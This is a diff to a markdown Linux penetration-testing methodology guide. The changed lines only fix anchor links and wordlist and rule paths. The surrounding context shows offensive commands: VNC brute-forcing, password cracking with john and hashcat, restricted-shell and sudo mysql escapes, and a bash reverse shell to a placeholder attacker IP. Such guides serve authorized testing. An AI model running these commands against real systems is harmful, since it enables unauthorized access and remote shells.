@@ -204,7 +204,7 @@ rpcinfo -p <IP>
 nmap -p 5900 --script vnc-info,vnc-brute -Pn <IP>
 ```
 
-[Back to top](#table-of-contents)
+[Back to top](#linux-penetration-testing-methodology)
 
 ---
 
@@ -251,7 +251,7 @@ searchsploit <SERVICE> <VERSION>
 
 ```bash
 # Common CGI paths to probe
-gobuster dir -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -x sh,cgi,pl -t 50
+gobuster dir -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/LEGACY-SERVICES/CGIs/CGIs.txt -x sh,cgi,pl -t 50
 
 # Manual hits to check
 curl -I http://<TARGET>/cgi-bin/<APP_PATH>
@@ -338,7 +338,7 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 # For more cracking options, see password-cracking.md Phase 4.2 (x2john)
 ```
 
-[Back to top](#table-of-contents)
+[Back to top](#linux-penetration-testing-methodology)
 
 ---
 
@@ -736,7 +736,7 @@ ssh user@host -t '/tmp/bb sh'
 
 > Cross-reference: every binary listed in `compgen -c` (or visible in `/usr/lib/<rbash-shellname>/`) → check [GTFOBins → Shell](https://gtfobins.github.io/#+shell) for a known escape.
 
-[Back to top](#table-of-contents)
+[Back to top](#linux-penetration-testing-methodology)
 
 ---
 
@@ -4643,7 +4643,7 @@ sudo mysql -e '\! id > /tmp/mysql_escape_proof'
 cat /tmp/mysql_escape_proof
 ```
 
-[Back to top](#table-of-contents)
+[Back to top](#linux-penetration-testing-methodology)
 
 ### 4.17 Sudo /usr/bin/ssh — PermitLocalCommand / ProxyCommand Shell Escape
 
@@ -5960,7 +5960,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt rar.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt 7z.hash
 
 # Apply custom rules for better cracking (mutate wordlist)
-hashcat --force wordlist.txt -r /usr/share/hashcat/rules/best64.rule --stdout | sort -u > mutated.txt
+hashcat --force wordlist.txt -r /usr/share/john/rules/best64.rule --stdout | sort -u > mutated.txt
 john --wordlist=mutated.txt hash.txt
 ```
 
@@ -7631,7 +7631,7 @@ echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1 &  # engagement-tes
 > - Target is domain-joined and you have creds? → [Active Directory Methodology — Phase 2](active-directory-methodology.md) Phase 2
 > - Need to transfer files or tools? → [File Transfer Techniques](file-transfers.md)
 
-[Back to top](#table-of-contents)
+[Back to top](#linux-penetration-testing-methodology)
 
 ---
 
